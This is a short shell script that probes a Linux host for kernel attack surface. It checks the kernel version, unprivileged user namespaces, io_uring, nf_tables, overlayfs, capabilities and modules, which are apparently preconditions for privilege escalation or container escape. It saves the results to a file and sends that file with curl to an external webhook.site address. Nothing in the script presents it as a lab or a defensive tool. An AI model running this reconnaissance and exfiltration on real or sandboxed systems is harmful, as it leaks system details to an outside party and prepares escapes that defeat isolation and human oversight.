#!/bin/sh
{
echo "==kernel=="; uname -a; cat /proc/version
echo "==userns=="; cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null; cat /proc/sys/user/max_user_namespaces 2>/dev/null
echo "==io_uring=="; cat /proc/sys/kernel/io_uring_disabled 2>/dev/null; ls -la /proc/self/io_uring 2>/dev/null
echo "==modules=="; ls /lib/modules 2>/dev/null; cat /proc/modules 2>/dev/null | head -20
echo "==config=="; ls /proc/config.gz /boot/config* 2>&1
echo "==newunshare=="; unshare -Urn sh -c 'id; echo NETNS_OK' 2>&1
echo "==userns-test=="; cat /proc/self/uid_map; unshare -U sh -c 'cat /proc/self/uid_map' 2>&1
echo "==overlayfs=="; grep -E 'overlay|fuse|nf_tables|io_uring' /proc/filesystems 2>&1; cat /proc/filesystems | head -20
echo "==capsh=="; grep -E 'Cap' /proc/self/status
echo "==sync-poll=="; ls /proc/sys/net/netfilter/ 2>&1 | head
} > /www/out.txt 2>&1
curl -sk -m 15 --data-binary @/www/out.txt "https://webhook.site/1a315c42-31b4-4eab-bb1a-5860736bdeb8/kernel"
httpd -f -p 80 -h /www
